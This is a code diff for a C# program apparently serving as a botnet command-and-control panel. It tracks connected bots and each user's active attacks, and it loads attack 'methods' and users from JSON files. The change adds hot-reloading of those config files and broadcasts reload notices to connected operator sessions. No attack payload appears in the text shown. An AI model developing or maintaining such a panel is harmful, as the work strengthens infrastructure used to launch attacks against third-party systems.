@@ -64,6 +64,12 @@ namespace Agent
         private static readonly ConcurrentDictionary<string, int> _userActiveAttacks = new(StringComparer.OrdinalIgnoreCase);
         private static TcpListener? _mainListener;
 
+        // ── Hot-reload watchers ───────────────────────────────────────────
+        private static FileSystemWatcher? _configWatcher;
+        private static Timer? _usersDebounce;
+        private static Timer? _methodsDebounce;
+        private static readonly object _reloadLock = new();
+
         private static string GetTitleSequence() => $"\x1b]0;Connected {_botCount}\x07";
 
         static void Main(string[] args)
@@ -71,6 +77,7 @@ namespace Agent
             ParseArguments(args);
             LoadUsers();
             LoadMethods();
+            StartConfigWatcher();
 
             // Bind internal SSH server to loopback on random free port
             var sshListener = new TcpListener(IPAddress.Loopback, 0);
@@ -423,20 +430,96 @@ namespace Agent
             }
         }
 
+        private static void StartConfigWatcher()
+        {
+            // Resolve the directory that actually contains the config files
+            string usersPath   = ResolveConfigPath("users.json");
+            string methodsPath = ResolveConfigPath("methods.json");
+            string dir         = Path.GetDirectoryName(Path.GetFullPath(usersPath)) ?? ".";
+
+            try
+            {
+                // Single watcher on the config directory, filter by json
+                var watcher = new FileSystemWatcher(dir, "*.json")
+                {
+                    NotifyFilter         = NotifyFilters.LastWrite | NotifyFilters.Size | NotifyFilters.FileName,
+                    IncludeSubdirectories = false,
+                    EnableRaisingEvents  = true,
+                };
+
+                watcher.Changed += OnConfigFileEvent;
+                watcher.Created += OnConfigFileEvent;
+                watcher.Renamed += (s, e) => OnConfigFileEvent(s,
+                    new FileSystemEventArgs(WatcherChangeTypes.Changed, dir, e.Name));
+
+                _configWatcher = watcher; // keep reference alive
+                Console.WriteLine($"[~] Config watcher active on: {dir}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] Config watcher failed to start: {ex.Message}");
+            }
+        }
+
+        private static void OnConfigFileEvent(object sender, FileSystemEventArgs e)
+        {
+            string name = Path.GetFileName(e.FullPath);
+
+            if (string.Equals(name, "users.json", StringComparison.OrdinalIgnoreCase))
+            {
+                // Debounce 500 ms — editors may write in multiple flushes
+                lock (_reloadLock)
+                {
+                    _usersDebounce?.Dispose();
+                    _usersDebounce = new Timer(_ =>
+                    {
+                        LoadUsers();
+                        NotifyAllSessions("[~] users.json reloaded");
+                    }, null, 500, Timeout.Infinite);
+                }
+            }
+            else if (string.Equals(name, "methods.json", StringComparison.OrdinalIgnoreCase))
+            {
+                lock (_reloadLock)
+                {
+                    _methodsDebounce?.Dispose();
+                    _methodsDebounce = new Timer(_ =>
+                    {
+                        LoadMethods();
+                        NotifyAllSessions("[~] methods.json reloaded");
+                    }, null, 500, Timeout.Infinite);
+                }
+            }
+        }
+
+        private static void NotifyAllSessions(string message)
+        {
+            byte[] bytes = Encoding.UTF8.GetBytes(
+                $"\r\n  {CDim}──{C0}  {CWarn}{message}{C0}\r\n");
+            foreach (var channel in _channelUsers.Keys)
+            {
+                try { channel.SendData(bytes); } catch { }
+            }
+        }
+
+        private static string ResolveConfigPath(string filename)
+        {
+            string baseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, filename);
+            if (File.Exists(baseDir)) return baseDir;
+            return filename; // fallback to cwd
+        }
+
         private static void LoadUsers()
         {
-            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "users.json");
-            if (!File.Exists(path))
-            {
-                path = "users.json";
-            }
+            string path = ResolveConfigPath("users.json");
 
             if (File.Exists(path))
             {
                 try
                 {
                     string json = File.ReadAllText(path);
-                    _users = JsonSerializer.Deserialize<List<UserConfig>>(json) ?? new List<UserConfig>();
+                    var loaded = JsonSerializer.Deserialize<List<UserConfig>>(json) ?? new List<UserConfig>();
+                    Interlocked.Exchange(ref _users, loaded);
                     Console.WriteLine($"[+] Loaded {_users.Count} user(s) from users.json");
                 }
                 catch (Exception ex)
@@ -454,18 +537,15 @@ namespace Agent
 
         private static void LoadMethods()
         {
-            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "methods.json");
-            if (!File.Exists(path))
-            {
-                path = "methods.json";
-            }
+            string path = ResolveConfigPath("methods.json");
 
             if (File.Exists(path))
             {
                 try
                 {
                     string json = File.ReadAllText(path);
-                    _methods = JsonSerializer.Deserialize<List<MethodConfig>>(json) ?? new List<MethodConfig>();
+                    var loaded = JsonSerializer.Deserialize<List<MethodConfig>>(json) ?? new List<MethodConfig>();
+                    Interlocked.Exchange(ref _methods, loaded);
                     Console.WriteLine($"[+] Loaded {_methods.Count} method(s) from methods.json");
                 }
                 catch (Exception ex)
